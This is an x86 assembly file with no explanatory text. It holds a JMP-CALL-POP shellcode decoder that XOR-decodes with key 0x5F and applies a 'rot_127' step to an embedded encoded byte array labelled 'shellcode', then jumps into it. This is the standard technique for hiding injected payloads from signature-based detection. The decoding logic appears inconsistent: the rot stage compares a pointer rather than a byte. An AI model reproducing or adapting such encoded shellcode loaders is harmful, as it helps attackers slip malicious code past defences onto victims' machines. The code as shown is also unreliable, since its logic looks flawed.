global _start
section .text
_start:

xor ebp, ebp

jmp short call_main

decoder:
	pop esi
	mov edi, esi ; saving address of Shellcode for rot
	xor ecx, ecx
	mov cl, 0x50

unxor:
        xor byte [esi], 0x5F
        jz rot_127
        inc esi
        jmp short unxor


rot_127:
	cmp edi, 0x7F
	jl low
	sub edi, 0x7F
	jmp norm

low:
	xor ebx, ebx
	xor edx, edx
	mov bl, 0x60
	mov dl, 0xFF
	inc dx
	sub [edi], bl
	sub dx, bx
	mov [edi], dl
	jmp shellcode

norm:
	inc edi
	loop rot_127

call_main:
	call decoder
	shellcode: db 0xef,0x60,0xef,0x05,0x90,0xb6,0xdf,0xb6,0xde,0x70,0xba,0x6d,0xdf,0x57,0x3f,0x13,0xa0,0x4a,0x70,0xba,0x5d,0x1d,0xde,0xb8,0xa1,0x21,0x21,0x31,0xba,0xb8,0xfd,0x5e,0xba,0xb6,0xde,0x57,0x3f,0xb6,0xd0,0x8f,0x8a,0x57,0x3f,0x13,0xa0,0x4a,0xef,0x17,0xa0,0x1f,0xde,0x70,0xe1,0x13,0xa0,0x22,0x17,0xa7,0x28,0x90,0xb8,0xf1,0xa6,0xad,0xb8,0xb8,0xf1,0xbe,0xb7,0xb2,0x57,0x3d,0x90,0x8d,0x57,0x3f,0x70,0xd5,0x13,0xa0, 0x5F